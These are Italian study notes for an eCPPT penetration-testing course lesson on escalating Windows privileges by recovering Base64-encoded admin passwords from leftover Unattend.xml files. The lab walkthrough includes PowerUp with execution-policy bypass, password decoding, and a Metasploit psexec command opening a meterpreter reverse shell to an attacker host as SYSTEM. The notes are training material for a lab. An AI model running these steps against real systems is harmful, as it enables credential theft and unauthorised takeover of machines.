# 05 — Unattended Installation Files (Privilege Escalation)

> **Modulo:** Privilege Escalation · **Video:** 5/19
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [05_ Unattended Installation Files.txt](05_ Unattended Installation Files.txt) · [05_ Unattended Installation Files.srt](05_ Unattended Installation Files.srt)

## Concetti chiave

- L'**Unattended Windows Setup** è un meccanismo Microsoft per automatizzare deployment di Windows su molti sistemi.
- Utilizza file di **configurazione XML** che possono contenere **credenziali admin** (spesso solo encoded in Base64, NON cifrate).
- Locazioni standard dei file:
  - `C:\Windows\Panther\Unattend.xml`
  - `C:\Windows\Panther\Autounattend.xml`
- Best practice Microsoft: eliminare/redact dopo l'installazione → spesso non rispettata → **artifact lasciato sul disco**.
- Le password sono in **`<AutoLogon>`** sotto il tag `<Password>` con `<PlainText>false</PlainText>` ⇒ Base64.

## Spiegazione approfondita

### Cos'è l'Unattended Setup
- Tool per **mass deployment** di Windows in ambienti enterprise.
- L'admin configura un file XML con setup, account, password → installazione senza interazione.
- Inseparabilmente legato ad ambienti corporate con tante macchine.

### Perché è un vettore di privesc
1. Le credenziali (admin password) restano scritte nel file XML.
2. Il file rimane **leggibile da tutti gli utenti** dopo l'installazione.
3. La password è **encoded in Base64**, NON cifrata → decoding banale.
4. Anche se l'admin password fosse stata cambiata, il **riuso credenziali** spesso funziona ancora (lateral via PtH).

### Workflow del lab
1. Accesso come `student` low-priv su target Windows.
2. Esecuzione **PowerUp** → `Invoke-PrivescAudit` → identifica path Unattend.
3. `cat C:\Windows\Panther\Unattend.xml` → trova blocco `<AutoLogon>` con password Base64.
4. Decoding Base64 → password clear-text (`admin123` nel lab).
5. Sfruttamento via `runas`, `msfconsole` PsExec, ecc.

### Versioni Windows
- Windows Server 2012/2016+ → password sempre Base64 by default (non cifratura reale).
- Vecchie versioni: anche clear-text diretto.

## Comandi & strumenti

| Comando | Scopo |
|---|---|
| `Invoke-PrivescAudit` | Check automatico via PowerUp (identifica Unattend) |
| `cat C:\Windows\Panther\Unattend.xml` | Lettura manuale del file |
| `cat C:\Windows\Panther\Autounattend.xml` | Variante alternativa |
| `echo "<b64>" \| base64 -d` (Linux) | Decoding Base64 |
| `[Convert]::FromBase64String("<b64>")` (PS) | Decoding Base64 in PowerShell |
| `runas.exe /user:administrator cmd` | Elevazione locale |
| `use exploit/windows/smb/psexec` (msf) | Remote shell elevata via SMB |

## Esempi pratici

```powershell
# Step 1 — PowerUp per rilevare automaticamente
cd C:\Users\student\Desktop\PowerSploit\Privesc
powershell -ep bypass
. .\PowerUp.ps1
Invoke-PrivescAudit
# Output: UnattendPath: C:\Windows\Panther\Unattend.xml

# Step 2 — Lettura manuale del file
cat C:\Windows\Panther\Unattend.xml
# Cerca blocco:
# <AutoLogon>
#   <Password>
#     <Value>YWRtaW4xMjM=</Value>
#     <PlainText>false</PlainText>
#   </Password>
#   <Username>Administrator</Username>
# </AutoLogon>
```

```bash
# Step 3 — Decode Base64 (da Kali)
echo "YWRtaW4xMjM=" | base64 -d
# Output: admin123

# Step 4 — Sfruttamento via Metasploit PsExec
msfconsole -q
use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set SMBUser administrator
set SMBPass admin123
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <KALI_IP>
exploit
# → meterpreter come NT AUTHORITY\SYSTEM
```

## Punti d'attenzione per l'esame eCPPT

- **Path da memorizzare**:
  - `C:\Windows\Panther\Unattend.xml`
  - `C:\Windows\Panther\Autounattend.xml`
- Le password sono **Base64-encoded**, NON cifrate → `base64 -d` basta.
- È una **misconfig classica enterprise** → l'esame può presentare uno scenario "trova credenziali nel sistema".
- **Triade Locally Stored Credentials su Windows** (video 05-07):
  1. **Unattended files** (deployment)
  2. **Credential Manager** (`cmdkey /list`)
  3. **PowerShell History** (`ConsoleHost_history.txt`)
- Una volta ottenute le admin credentials → **psexec** dà `NT AUTHORITY\SYSTEM` direttamente.
- Verifica sempre **entrambi i path** Unattend e Autounattend.

## Collegamenti con altri video

- Precedente: [[04_Privilege Escalation with Privesc Check]]
- Prossimo: [[06_Windows Credential Manager]] — secondo vettore locally stored creds.
- Successivo correlato: [[07_ PowerShell History]] — terzo vettore.
- Strumento usato: [[03_Privilege Escalation with PowerUp]].
